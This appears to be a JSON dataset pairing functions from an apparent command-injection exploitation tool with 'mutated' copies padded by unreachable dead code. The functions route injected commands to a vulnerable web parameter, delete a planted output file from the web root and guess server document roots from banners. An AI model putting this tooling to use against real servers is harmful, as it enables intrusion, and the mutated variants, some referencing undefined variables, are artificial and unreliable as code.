[
    {
        "func_name": "tfb_controller",
        "original": "def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + tmp_path + \"' as temporary directory.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = 'Trying to create a file in temporary '\n        info_msg += \"directory ('\" + tmp_path + \"') for command execution output.\\n\"\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n        return call_tfb\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
        "mutated": [
            "def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):\n    if False:\n        i = 10\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + tmp_path + \"' as temporary directory.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = 'Trying to create a file in temporary '\n        info_msg += \"directory ('\" + tmp_path + \"') for command execution output.\\n\"\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n        return call_tfb\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + tmp_path + \"' as temporary directory.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = 'Trying to create a file in temporary '\n        info_msg += \"directory ('\" + tmp_path + \"') for command execution output.\\n\"\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n        return call_tfb\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + tmp_path + \"' as temporary directory.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = 'Trying to create a file in temporary '\n        info_msg += \"directory ('\" + tmp_path + \"') for command execution output.\\n\"\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n        return call_tfb\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + tmp_path + \"' as temporary directory.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = 'Trying to create a file in temporary '\n        info_msg += \"directory ('\" + tmp_path + \"') for command execution output.\\n\"\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n        return call_tfb\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def tfb_controller(no_result, url, timesec, filename, tmp_path, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Using '\" + tmp_path + \"' as temporary directory.\"\n            print(settings.print_debug_msg(debug_msg))\n        info_msg = 'Trying to create a file in temporary '\n        info_msg += \"directory ('\" + tmp_path + \"') for command execution output.\\n\"\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        call_tfb = tfb_handler.exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response)\n        return call_tfb\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()"
        ]
    },
    {
        "func_name": "delete_previous_shell",
        "original": "def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):\n    if settings.FILE_BASED_STATE != None:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Deleting the generated file '\" + OUTPUT_TEXTFILE + \"'.\"\n            print(settings.print_debug_msg(debug_msg))\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE\n        else:\n            cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT\n        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)",
        "mutated": [
            "def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):\n    if False:\n        i = 10\n    if settings.FILE_BASED_STATE != None:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Deleting the generated file '\" + OUTPUT_TEXTFILE + \"'.\"\n            print(settings.print_debug_msg(debug_msg))\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE\n        else:\n            cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT\n        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)",
            "def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.FILE_BASED_STATE != None:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Deleting the generated file '\" + OUTPUT_TEXTFILE + \"'.\"\n            print(settings.print_debug_msg(debug_msg))\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE\n        else:\n            cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT\n        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)",
            "def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.FILE_BASED_STATE != None:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Deleting the generated file '\" + OUTPUT_TEXTFILE + \"'.\"\n            print(settings.print_debug_msg(debug_msg))\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE\n        else:\n            cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT\n        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)",
            "def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.FILE_BASED_STATE != None:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Deleting the generated file '\" + OUTPUT_TEXTFILE + \"'.\"\n            print(settings.print_debug_msg(debug_msg))\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE\n        else:\n            cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT\n        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)",
            "def delete_previous_shell(separator, payload, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.FILE_BASED_STATE != None:\n        if settings.VERBOSITY_LEVEL != 0:\n            debug_msg = \"Deleting the generated file '\" + OUTPUT_TEXTFILE + \"'.\"\n            print(settings.print_debug_msg(debug_msg))\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            cmd = settings.WIN_DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE\n        else:\n            cmd = settings.DEL + settings.WEB_ROOT + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT\n        response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)"
        ]
    },
    {
        "func_name": "custom_web_root",
        "original": "def custom_web_root(url, timesec, filename, http_request_method, url_time_response):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        example_root_dir = '\\\\inetpub\\\\wwwroot'\n    else:\n        example_root_dir = '/var/www'\n    message = \"Please provide web server document root directory (e.g. '\"\n    message += example_root_dir + \"') > \"\n    settings.WEB_ROOT = common.read_input(message, default=example_root_dir, check_batch=True)\n    if settings.WEB_ROOT.endswith(('\\\\', '/')):\n        settings.WEB_ROOT = settings.WEB_ROOT[:-1]\n    if len(settings.WEB_ROOT) == 0:\n        settings.WEB_ROOT = example_root_dir\n    if menu.options.web_root:\n        menu.options.web_root = settings.WEB_ROOT\n    settings.CUSTOM_WEB_ROOT = True",
        "mutated": [
            "def custom_web_root(url, timesec, filename, http_request_method, url_time_response):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        example_root_dir = '\\\\inetpub\\\\wwwroot'\n    else:\n        example_root_dir = '/var/www'\n    message = \"Please provide web server document root directory (e.g. '\"\n    message += example_root_dir + \"') > \"\n    settings.WEB_ROOT = common.read_input(message, default=example_root_dir, check_batch=True)\n    if settings.WEB_ROOT.endswith(('\\\\', '/')):\n        settings.WEB_ROOT = settings.WEB_ROOT[:-1]\n    if len(settings.WEB_ROOT) == 0:\n        settings.WEB_ROOT = example_root_dir\n    if menu.options.web_root:\n        menu.options.web_root = settings.WEB_ROOT\n    settings.CUSTOM_WEB_ROOT = True",
            "def custom_web_root(url, timesec, filename, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        example_root_dir = '\\\\inetpub\\\\wwwroot'\n    else:\n        example_root_dir = '/var/www'\n    message = \"Please provide web server document root directory (e.g. '\"\n    message += example_root_dir + \"') > \"\n    settings.WEB_ROOT = common.read_input(message, default=example_root_dir, check_batch=True)\n    if settings.WEB_ROOT.endswith(('\\\\', '/')):\n        settings.WEB_ROOT = settings.WEB_ROOT[:-1]\n    if len(settings.WEB_ROOT) == 0:\n        settings.WEB_ROOT = example_root_dir\n    if menu.options.web_root:\n        menu.options.web_root = settings.WEB_ROOT\n    settings.CUSTOM_WEB_ROOT = True",
            "def custom_web_root(url, timesec, filename, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        example_root_dir = '\\\\inetpub\\\\wwwroot'\n    else:\n        example_root_dir = '/var/www'\n    message = \"Please provide web server document root directory (e.g. '\"\n    message += example_root_dir + \"') > \"\n    settings.WEB_ROOT = common.read_input(message, default=example_root_dir, check_batch=True)\n    if settings.WEB_ROOT.endswith(('\\\\', '/')):\n        settings.WEB_ROOT = settings.WEB_ROOT[:-1]\n    if len(settings.WEB_ROOT) == 0:\n        settings.WEB_ROOT = example_root_dir\n    if menu.options.web_root:\n        menu.options.web_root = settings.WEB_ROOT\n    settings.CUSTOM_WEB_ROOT = True",
            "def custom_web_root(url, timesec, filename, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        example_root_dir = '\\\\inetpub\\\\wwwroot'\n    else:\n        example_root_dir = '/var/www'\n    message = \"Please provide web server document root directory (e.g. '\"\n    message += example_root_dir + \"') > \"\n    settings.WEB_ROOT = common.read_input(message, default=example_root_dir, check_batch=True)\n    if settings.WEB_ROOT.endswith(('\\\\', '/')):\n        settings.WEB_ROOT = settings.WEB_ROOT[:-1]\n    if len(settings.WEB_ROOT) == 0:\n        settings.WEB_ROOT = example_root_dir\n    if menu.options.web_root:\n        menu.options.web_root = settings.WEB_ROOT\n    settings.CUSTOM_WEB_ROOT = True",
            "def custom_web_root(url, timesec, filename, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        example_root_dir = '\\\\inetpub\\\\wwwroot'\n    else:\n        example_root_dir = '/var/www'\n    message = \"Please provide web server document root directory (e.g. '\"\n    message += example_root_dir + \"') > \"\n    settings.WEB_ROOT = common.read_input(message, default=example_root_dir, check_batch=True)\n    if settings.WEB_ROOT.endswith(('\\\\', '/')):\n        settings.WEB_ROOT = settings.WEB_ROOT[:-1]\n    if len(settings.WEB_ROOT) == 0:\n        settings.WEB_ROOT = example_root_dir\n    if menu.options.web_root:\n        menu.options.web_root = settings.WEB_ROOT\n    settings.CUSTOM_WEB_ROOT = True"
        ]
    },
    {
        "func_name": "check_tmp_path",
        "original": "def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            settings.TMP_PATH = 'C:\\\\Windows\\\\TEMP\\\\'\n        else:\n            settings.TMP_PATH = '%temp%\\\\'\n    else:\n        settings.TMP_PATH = '/tmp/'\n    if menu.options.tmp_path:\n        tmp_path = menu.options.tmp_path\n    else:\n        tmp_path = settings.TMP_PATH\n    if settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:\n        settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT\n    if menu.options.file_dest and '/tmp/' in menu.options.file_dest:\n        call_tmp_based = True\n    if menu.options.web_root:\n        settings.WEB_ROOT = menu.options.web_root\n    else:\n        if 'apache' in settings.SERVER_BANNER.lower():\n            if 'debian' or 'ubuntu' in settings.SERVER_BANNER.lower():\n                try:\n                    check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                    if check_version[0] > '2.3' and (not settings.TARGET_OS == settings.OS.WINDOWS):\n                        settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                    else:\n                        settings.WEB_ROOT = settings.WEB_ROOT\n                except IndexError:\n                    pass\n            elif 'fedora' or 'centos' in settings.SERVER_BANNER.lower():\n                settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n            else:\n                pass\n        elif 'nginx' in settings.SERVER_BANNER.lower():\n            try:\n                check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                if check_version[0] >= '1.2.4':\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                else:\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/www'\n            except IndexError:\n                pass\n        elif 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            pass\n        else:\n            custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n        path = _urllib.parse.urlparse(url).path\n        path_parts = path.split('/')\n        count = 0\n        for part in path_parts:\n            count = count + 1\n        count = count - 1\n        last_param = path_parts[count]\n        EXTRA_DIR = path.replace(last_param, '')\n        settings.WEB_ROOT = settings.WEB_ROOT + EXTRA_DIR\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            settings.WEB_ROOT = settings.WEB_ROOT.replace('/', '\\\\')\n    return tmp_path",
        "mutated": [
            "def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            settings.TMP_PATH = 'C:\\\\Windows\\\\TEMP\\\\'\n        else:\n            settings.TMP_PATH = '%temp%\\\\'\n    else:\n        settings.TMP_PATH = '/tmp/'\n    if menu.options.tmp_path:\n        tmp_path = menu.options.tmp_path\n    else:\n        tmp_path = settings.TMP_PATH\n    if settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:\n        settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT\n    if menu.options.file_dest and '/tmp/' in menu.options.file_dest:\n        call_tmp_based = True\n    if menu.options.web_root:\n        settings.WEB_ROOT = menu.options.web_root\n    else:\n        if 'apache' in settings.SERVER_BANNER.lower():\n            if 'debian' or 'ubuntu' in settings.SERVER_BANNER.lower():\n                try:\n                    check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                    if check_version[0] > '2.3' and (not settings.TARGET_OS == settings.OS.WINDOWS):\n                        settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                    else:\n                        settings.WEB_ROOT = settings.WEB_ROOT\n                except IndexError:\n                    pass\n            elif 'fedora' or 'centos' in settings.SERVER_BANNER.lower():\n                settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n            else:\n                pass\n        elif 'nginx' in settings.SERVER_BANNER.lower():\n            try:\n                check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                if check_version[0] >= '1.2.4':\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                else:\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/www'\n            except IndexError:\n                pass\n        elif 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            pass\n        else:\n            custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n        path = _urllib.parse.urlparse(url).path\n        path_parts = path.split('/')\n        count = 0\n        for part in path_parts:\n            count = count + 1\n        count = count - 1\n        last_param = path_parts[count]\n        EXTRA_DIR = path.replace(last_param, '')\n        settings.WEB_ROOT = settings.WEB_ROOT + EXTRA_DIR\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            settings.WEB_ROOT = settings.WEB_ROOT.replace('/', '\\\\')\n    return tmp_path",
            "def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            settings.TMP_PATH = 'C:\\\\Windows\\\\TEMP\\\\'\n        else:\n            settings.TMP_PATH = '%temp%\\\\'\n    else:\n        settings.TMP_PATH = '/tmp/'\n    if menu.options.tmp_path:\n        tmp_path = menu.options.tmp_path\n    else:\n        tmp_path = settings.TMP_PATH\n    if settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:\n        settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT\n    if menu.options.file_dest and '/tmp/' in menu.options.file_dest:\n        call_tmp_based = True\n    if menu.options.web_root:\n        settings.WEB_ROOT = menu.options.web_root\n    else:\n        if 'apache' in settings.SERVER_BANNER.lower():\n            if 'debian' or 'ubuntu' in settings.SERVER_BANNER.lower():\n                try:\n                    check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                    if check_version[0] > '2.3' and (not settings.TARGET_OS == settings.OS.WINDOWS):\n                        settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                    else:\n                        settings.WEB_ROOT = settings.WEB_ROOT\n                except IndexError:\n                    pass\n            elif 'fedora' or 'centos' in settings.SERVER_BANNER.lower():\n                settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n            else:\n                pass\n        elif 'nginx' in settings.SERVER_BANNER.lower():\n            try:\n                check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                if check_version[0] >= '1.2.4':\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                else:\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/www'\n            except IndexError:\n                pass\n        elif 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            pass\n        else:\n            custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n        path = _urllib.parse.urlparse(url).path\n        path_parts = path.split('/')\n        count = 0\n        for part in path_parts:\n            count = count + 1\n        count = count - 1\n        last_param = path_parts[count]\n        EXTRA_DIR = path.replace(last_param, '')\n        settings.WEB_ROOT = settings.WEB_ROOT + EXTRA_DIR\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            settings.WEB_ROOT = settings.WEB_ROOT.replace('/', '\\\\')\n    return tmp_path",
            "def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            settings.TMP_PATH = 'C:\\\\Windows\\\\TEMP\\\\'\n        else:\n            settings.TMP_PATH = '%temp%\\\\'\n    else:\n        settings.TMP_PATH = '/tmp/'\n    if menu.options.tmp_path:\n        tmp_path = menu.options.tmp_path\n    else:\n        tmp_path = settings.TMP_PATH\n    if settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:\n        settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT\n    if menu.options.file_dest and '/tmp/' in menu.options.file_dest:\n        call_tmp_based = True\n    if menu.options.web_root:\n        settings.WEB_ROOT = menu.options.web_root\n    else:\n        if 'apache' in settings.SERVER_BANNER.lower():\n            if 'debian' or 'ubuntu' in settings.SERVER_BANNER.lower():\n                try:\n                    check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                    if check_version[0] > '2.3' and (not settings.TARGET_OS == settings.OS.WINDOWS):\n                        settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                    else:\n                        settings.WEB_ROOT = settings.WEB_ROOT\n                except IndexError:\n                    pass\n            elif 'fedora' or 'centos' in settings.SERVER_BANNER.lower():\n                settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n            else:\n                pass\n        elif 'nginx' in settings.SERVER_BANNER.lower():\n            try:\n                check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                if check_version[0] >= '1.2.4':\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                else:\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/www'\n            except IndexError:\n                pass\n        elif 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            pass\n        else:\n            custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n        path = _urllib.parse.urlparse(url).path\n        path_parts = path.split('/')\n        count = 0\n        for part in path_parts:\n            count = count + 1\n        count = count - 1\n        last_param = path_parts[count]\n        EXTRA_DIR = path.replace(last_param, '')\n        settings.WEB_ROOT = settings.WEB_ROOT + EXTRA_DIR\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            settings.WEB_ROOT = settings.WEB_ROOT.replace('/', '\\\\')\n    return tmp_path",
            "def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            settings.TMP_PATH = 'C:\\\\Windows\\\\TEMP\\\\'\n        else:\n            settings.TMP_PATH = '%temp%\\\\'\n    else:\n        settings.TMP_PATH = '/tmp/'\n    if menu.options.tmp_path:\n        tmp_path = menu.options.tmp_path\n    else:\n        tmp_path = settings.TMP_PATH\n    if settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:\n        settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT\n    if menu.options.file_dest and '/tmp/' in menu.options.file_dest:\n        call_tmp_based = True\n    if menu.options.web_root:\n        settings.WEB_ROOT = menu.options.web_root\n    else:\n        if 'apache' in settings.SERVER_BANNER.lower():\n            if 'debian' or 'ubuntu' in settings.SERVER_BANNER.lower():\n                try:\n                    check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                    if check_version[0] > '2.3' and (not settings.TARGET_OS == settings.OS.WINDOWS):\n                        settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                    else:\n                        settings.WEB_ROOT = settings.WEB_ROOT\n                except IndexError:\n                    pass\n            elif 'fedora' or 'centos' in settings.SERVER_BANNER.lower():\n                settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n            else:\n                pass\n        elif 'nginx' in settings.SERVER_BANNER.lower():\n            try:\n                check_version = re.findall('/(.*)\\\\.', settings.SERVER_BANNER.lower())\n                if check_version[0] >= '1.2.4':\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/html'\n                else:\n                    settings.WEB_ROOT = settings.WEB_ROOT + '/www'\n            except IndexError:\n                pass\n        elif 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            pass\n        else:\n            custom_web_root(url, timesec, filename, http_request_method, url_time_response)\n        path = _urllib.parse.urlparse(url).path\n        path_parts = path.split('/')\n        count = 0\n        for part in path_parts:\n            count = count + 1\n        count = count - 1\n        last_param = path_parts[count]\n        EXTRA_DIR = path.replace(last_param, '')\n        settings.WEB_ROOT = settings.WEB_ROOT + EXTRA_DIR\n        if settings.TARGET_OS == settings.OS.WINDOWS:\n            settings.WEB_ROOT = settings.WEB_ROOT.replace('/', '\\\\')\n    return tmp_path",
            "def check_tmp_path(url, timesec, filename, http_request_method, url_time_response):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if 'microsoft-iis' in settings.SERVER_BANNER.lower():\n            settings.TMP_PATH = 'C:\\\\Windows\\\\TEMP\\\\'\n        else:\n            settings.TMP_PATH = '%temp%\\\\'\n    else:\n        settings.TMP_PATH = '/tmp/'\n    if menu.options.tmp_path:\n        tmp_path = menu.options.tmp_path\n    else:\n        tmp_path = settings.TMP_PATH\n    if settings.DEFAULT_WEB_ROOT != settings.WEB_ROOT:\n        settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT\n    if menu.options.file_dest and '/tmp/' in menu.options.file_dest:\n        call_tmp_based = True\n    if menu.options.web_root:\n        settings.WEB_ROOT = 